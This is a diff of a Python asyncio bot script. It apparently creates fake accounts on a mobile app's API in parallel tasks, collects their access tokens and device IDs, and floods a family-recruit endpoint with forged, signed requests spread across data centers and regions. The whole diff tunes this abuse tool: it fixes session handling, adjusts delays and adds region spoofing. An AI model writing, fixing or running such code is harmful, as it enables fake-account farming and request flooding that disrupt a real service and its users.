@@ -204,13 +204,12 @@ async def main():
             break
         lock = asyncio.Lock()
         asyncio.create_task(create_accounts(session, lock))
-        await asyncio.sleep(30)
         asyncio.create_task(flood_s(session, lock))
         await asyncio.sleep(9999999999999999999999999999999999999999)
 
 ACCOUNTS = []
 
-async def cr(lock):
+async def cr(session, lock):
     while True:
         kr = "ye"
         if kr == "ye":
@@ -358,11 +357,12 @@ async def cr(lock):
                                 token = answer["data"]["accessToken"]
                                 register_time = str(int(answer["data"]["registerTime"]))
                                 async with lock: ACCOUNTS.append(f"{user_id}:{token}:{android_id}:{register_time}:{device_register_time}")
+                        await asyncio.sleep(0.5)
             except Exception as e:
                 print(e)
 
 async def create_accounts(session, lock):
-        tasks = [asyncio.create_task(cr(lock)) for _ in range(5)]
+        tasks = [asyncio.create_task(cr(session, lock)) for _ in range(5)]
         await asyncio.gather(*tasks)
 
 async def flood_s(session, lock):
@@ -376,7 +376,25 @@ async def flood_s(session, lock):
                 nonce = str(uuid.uuid4())
                 xtime = str(int(time.time()))
                 xsign = get_xsign("/friend/api/v1/family/recruit", nonce, xtime, "", android_id)
-                region = "ru_RU"
+                region = [
+                    "zh_CN",
+                    "en_US",
+                    "de_DE",
+                    "es_ES",
+                    "fr_FR",
+                    "hi_IN",
+                    "in_ID",
+                    "it_IT",
+                    "ja_JP",
+                    "ko_KR",
+                    "pl_PL",
+                    "pt_PT",
+                    "ru_RU",
+                    "th_TH",
+                    "tr_TR",
+                    "uk_UA",
+                    "vi_VN"
+                ]
                 try:
                     async with session.delete(
                         f"http://{random.choice(DATA_CENTERS)}/friend/api/v1/family/recruit",
